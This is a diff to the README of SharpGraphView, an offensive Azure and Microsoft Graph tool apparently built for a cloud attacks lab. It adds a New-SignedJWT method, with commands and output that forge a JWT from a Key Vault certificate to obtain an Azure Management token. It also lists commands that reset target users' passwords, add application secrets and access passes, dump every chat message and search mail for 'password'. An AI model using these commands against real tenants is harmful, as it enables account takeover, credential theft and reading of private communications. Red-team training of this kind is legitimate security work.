@@ -18,6 +18,10 @@ Created during the new [Advanced Azure Cloud Attacks Lab](https://www.alteredsec
     - [Get-GraphTokens](#Get-GraphTokens)
     - [Invoke-RefreshToAzureManagementToken](#Invoke-RefreshToAzureManagementToken)
     - [Invoke-RefreshToMSGraphToken](#Invoke-RefreshToMSGraphToken)
+    - [Invoke-RefreshToVaultToken](#Invoke-RefreshToVaultToken)
+    - [Invoke-CertToAccessToken](#Invoke-CertToAccessToeken)
+    - [Get-TokenScope](#Get-TokenScope)
+    - [New-SignedJWT](#New-SignedJWT)
 - [Observations](#Observations)
     - [Common HTTP Error Codes](#Common-HTTP-Error-Codes)
 
@@ -27,17 +31,20 @@ Created during the new [Advanced Azure Cloud Attacks Lab](https://www.alteredsec
 
 - 10/05/2024
 ```
-Invoke-RefreshToVaultToken               - Convert refresh token to Azure Vault token (saved to vault_tokens.txt)
-Invoke-CertToAccessToken                 - Convert Azure Application certificate to JWT access token (saved to cert_tokens.txt)
-Update-UserPassword                      - Update the passwordProfile of the target user (NewUserS3cret@Pass!)
-Add-ApplicationPassword                  - Add client secret to target application
-Add-UserTAP                              - Add new Temporary Access Password (TAP) to target user
+Invoke-RefreshToVaultToken     - Convert refresh token to Azure Vault token (saved to vault_tokens.txt)
+Invoke-CertToAccessToken       - Convert Azure Application certificate to JWT access token (saved to cert_tokens.txt)
+Update-UserPassword            - Update the passwordProfile of the target user (NewUserS3cret@Pass!)
+Add-ApplicationPassword        - Add client secret to target application
+Add-UserTAP                    - Add new Temporary Access Password (TAP) to target user
 ```
 - 14/05/2024
 ```
-Get-TokenScope                           - Get scope for supplied token
+Get-TokenScope                 - Get scope for supplied token
 ```
-
+- 30/05/2024
+```
+New-SignedJWT                  - Construct JWT and sign using Key Vault certificate (Azure Key Vault access token required) then generate Azure Management (ARM) token
+```
 <br>
 
 # Build
@@ -74,6 +81,7 @@ Flags:
     -Domain                                  - Target domain
     -Tenant                                  - Target tenant ID
     -Id                                      - ID of target object
+    -Key                                     - Azure Key Vault name (New-SignedJWT)
     -Select                                  - Filter output for comma seperated properties
     -Query                                   - Raw API query (GET request only)
     -Search                                  - Search string
@@ -88,7 +96,8 @@ Auth:
     Invoke-RefreshToMSGraphToken             - Convert refresh token to Micrsoft Graph token (saved to new_graph_tokens.txt)
     Invoke-RefreshToAzureManagementToken     - Convert refresh token to Azure Management token (saved to az_tokens.txt)
     Invoke-RefreshToVaultToken               - Convert refresh token to Azure Vault token (saved to vault_tokens.txt)
-    Invoke-CertToAccessToken                 - Convert Azure Application certificate to JWT access token
+    Invoke-CertToAccessToken                 - Convert Azure Application certificate to JWT access token (saved to cert_tokens.txt)
+    New-SignedJWT                            - Construct JWT and sign using Key Vault certificate (Azure Key Vault access token required) then generate Azure Management (ARM) token
 
 Post-Auth:
 
@@ -108,7 +117,7 @@ Post-Auth:
     Get-PersonalContacts                     - Get contacts of the current user
     Get-CrossTenantAccessPolicy              - Get cross tentant access policy properties
     Get-PartnerCrossTenantAccessPolicy       - Get partner cross tenant access policy
-    Get-UserChatMessages                     - Get all messages from all chats for target user
+    Get-UserChatMessages                     - Get ALL messages from all chats for target user (Chat.Read.All)
     Get-AdministrativeUnitMember             - Get members of administrative unit
     Get-OneDriveFiles                        - Get all accessible OneDrive files for current user (default) or target user (-id)
     Get-UserPermissionGrants                 - Get permissions grants of current user (default) or target user (-id)
@@ -131,6 +140,7 @@ Post-Auth:
     List-Tenants                             - List tenants
     List-JoinedTeams                         - List joined teams for current user (default) or target user (-id)
     List-Chats                               - List chats for current user (default) or target user (-id)
+    List-ChatMessages                        - List messages in target chat (-id)
     List-Devices                             - List devices
     List-AdministrativeUnits                 - List administrative units
     List-OneDrives                           - List current user OneDrive (default) or target user (-id)
@@ -174,7 +184,7 @@ PS > .\SharpGraphView.exe Get-Group -token eyJ0eXAiOiJKV1QiLCJ...
 Path to Azure Application X509Certificate (**REQUIRED** for `Invoke-CertToAccessToken`):
 
 ```powershell
-.\SharpGraphView.exe invoke-certtoaccesstoken -tenant <tenant id> -cert .\cert.pfx -id <app id>
+.\SharpGraphView.exe Invoke-CertToAccessToken -tenant <tenant id> -cert .\cert.pfx -id <app id>
 ```
 
 <br>
@@ -203,16 +213,30 @@ ID of target object
 - can be the user ID or User Principal Name for user related methods
 - use the object ID for all others (groups, admin units, etc.)
 ```powershell
-PS > .\SharpGraphView.exe Get-user -id 5a48ab0f-c546-441f-832a-8ab48348e372 -token .\token.txt
+PS > .\SharpGraphView.exe Get-User -id 5a48ab0f-c546-441f-832a-8ab48348e372 -token .\token.txt
 PS > .\SharpGraphView.exe Get-User -id JohnDoe@TargetCorp1.onmicrosoft.com -token .\token.txt
 ```
+<br>
+
+#### -Key
+
+Key Vault certificate key name (**REQUIRED** for `New-SignedJWT` method) e.g. take the following Key Vault Certificate URL endpoint:
+```
+ https://devappvault.vault.azure.net/certificates/DevAppCert
+```
+The -Key value would be `DevAppCert`
+
+```powershell
+.\SharpGraphView.exe New-SignedJWT -id <appid> -tenant <tenantid>  -query https://devappvault.vault.azure.net -key DevAppCert -token <vault token>
+```
+
 <br>
 
 #### -Select
 
 Filter output and only display the supplied comma separated properties:
 ```powershell
-PS > .\SharpGraphView.exe get-group -token .\token.txt -select displayname,description
+PS > .\SharpGraphView.exe Get-Group -token .\token.txt -select displayname,description
 
 [*] Get-Group
 value: [
@@ -274,6 +298,7 @@ PS > .\SharpGraphView.exe invoke-search -search "password" -entity message -toke
 | **Invoke-RefreshToAzureManagementToken** -Token \<refresh\> -Tenant \<id\>    | Convert refresh token to Azure Management token (saved to _az_tokens.txt_)|
 |**Invoke-RefreshToVaultToken** -Token \<refresh\> | Convert refresh token to Azure Vault token (saved to _vault_tokens.txt_)|
 |**Invoke-CertToAccessToken** -Cert \<path to pfx\> -ID \<app id\> -Tenant \<id\>| Convert Azure Application certificate to JWT access token|
+|**New-SignedJWT** -ID \<appid\> -Tenant \<id\> -Query \<vault URL\> -key \<vault key\> -Token \<vault token\> |Construct JWT and sign using Key Vault certificate (Azure Key Vault access token required) then generate Azure Management (ARM) token|
 
 ### Post-Auth Methods:
 
@@ -343,9 +368,8 @@ PS > .\SharpGraphView.exe invoke-search -search "password" -entity message -toke
 |------------------------------------------|-----------------------------------------------------------------|-----------------------------------------------|
 | Add-GroupMember                          | Add user to target group                                              | `POST /groups/{group-id}/members/$ref`        |
 | Create-User                              | Create new malicious user                                                | `POST /users`          |
-| Download-DriveItem                       | Download content of DriveItem                                             | A lot of options, Invoke-CustomQuery can be used for now <br> `GET /drives/{drive-id}/items/{item-id}/content` <br> `GET /groups/{group-id}/drive/items/{item-id}/content` <br> ... |
 
-Addtional `Invoke-RefreshTo...` methods can and will be ported from [TokenHandler.ps1](https://github.com/rvrsh3ll/TokenTactics/blob/main/modules/TokenHandler.ps1).
+Addtional `Invoke-RefreshTo...` methods can be ported from [TokenHandler.ps1](https://github.com/rvrsh3ll/TokenTactics/blob/main/modules/TokenHandler.ps1).
 
 <br>
 <br>
@@ -489,6 +513,46 @@ User.ReadBasic.All
 User.ReadWrite
 Users.Read
 ```
+
+## New-SignedJWT
+
+Construct new JWT token with the details extracted from Key Vault Certificate and sign it. Requires the following permissions:
+```
+Microsoft.KeyVault/vaults/certificates/read
+Microsoft.KeyVault/vaults/keys/read
+Microsoft.KeyVault/vaults/keys/sign/action
+```
+Generating a signed JWT and request an Azure Management token (ARM):
+```powershell
+PS > .\SharpGraphView.exe New-SignedJWT -id f9f75aac-fe0a-47e6-bfd3-98d8af327d8a -tenant fbf34b9d-6375-4137-ae1f-8cb12df29bb5 -query https://DevAppVault.vault.azure.net -key DevAppCert -token $vault_token
+
+[*] New-SignedJWT
+
+[+] Certificate Details Obtained!
+kid: https://devappvault.vault.azure.net/keys/DevAppCert/2fb10001e7f0474916dec596b3818d56
+x5t: 9xdFz3zEX8jJax-ihve1h-GhmQa
+
+[+] Forged JWT:
+eyJ4NXQiOiJxNnhGejN6RVg4akpheC1paHZlMWgtUmR1TVUiLCJ0eXAiOi...
+
+[+] Azure Management Token Obtained!
+[*] Application ID: f9f75aac-fe0a-47e6-bfd3-98d8af327d8a
+[*] Tenant ID: fbf34b9d-6375-4137-ae1f-8cb12df29bb5
+[*] Scope: https://management.azure.com/.default
+[*] token_type: Bearer
+[*] expires_in: 3599
+[*] ext_expires_in: 3599
+[*] access_token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IkwxS2ZLRklfam5YYndXYzI...
+```
+The returned management token can then be used to authenticate to Azure:
+```powershell
+PS > Connect-AzAccount -AccessToken eyJ0eXAiOi... -AccountId f9f75aac-fe0a-47e6-bfd3-98d8af327d8a
+
+Account                              SubscriptionName       TenantId                             Environment
+-------                              ----------------       --------                             -----------
+f9f75aac-fe0a-47e6-bfd3-98d8af327d8a TargetCorp-1           fbf34b9d-6375-4137-ae1f-8cb12df29bb5 AzureCloud
+```
+
 
 <br>
 
